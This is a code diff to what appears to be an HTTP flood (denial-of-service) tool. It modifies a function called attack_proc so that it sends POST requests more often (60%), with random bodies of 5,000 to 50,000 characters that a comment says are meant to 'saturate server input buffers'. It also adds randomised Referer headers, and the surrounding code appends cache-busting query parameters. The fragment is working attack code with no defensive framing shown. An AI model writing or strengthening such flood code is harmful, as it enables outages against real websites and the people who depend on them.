@@ -75,15 +75,15 @@ def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shar
                     sep = '&' if '?' in curr_path else '?'
                     curr_path = f"{path}{sep}t={rnd}"
                 
-                if mode == '4' and random.random() > 0.5:
+                if mode == '4' and random.random() > 0.4: # 60% chance for heavy POST
                     method = "POST"
-                    post_data = get_random_string(random.randint(500, 1500))
-                
-                payload_str = f"{method} {curr_path} HTTP/1.1\r\n{common_headers}"
-                if method == "POST":
+                    # Very large random body to saturate server input buffers
+                    post_data = get_random_string(random.randint(5000, 50000)) 
+                    headers_local = common_headers + f"Referer: {random.choice(REFERERS)}\r\n"
+                    payload_str = f"{method} {curr_path} HTTP/1.1\r\n{headers_local}"
                     payload_str += f"Content-Length: {len(post_data)}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{post_data}"
                 else:
-                    payload_str += "\r\n"
+                    payload_str = f"{method} {curr_path} HTTP/1.1\r\n{common_headers}\r\n"
 
                 payload = payload_str.encode('utf-8')
                 s.sendall(payload)
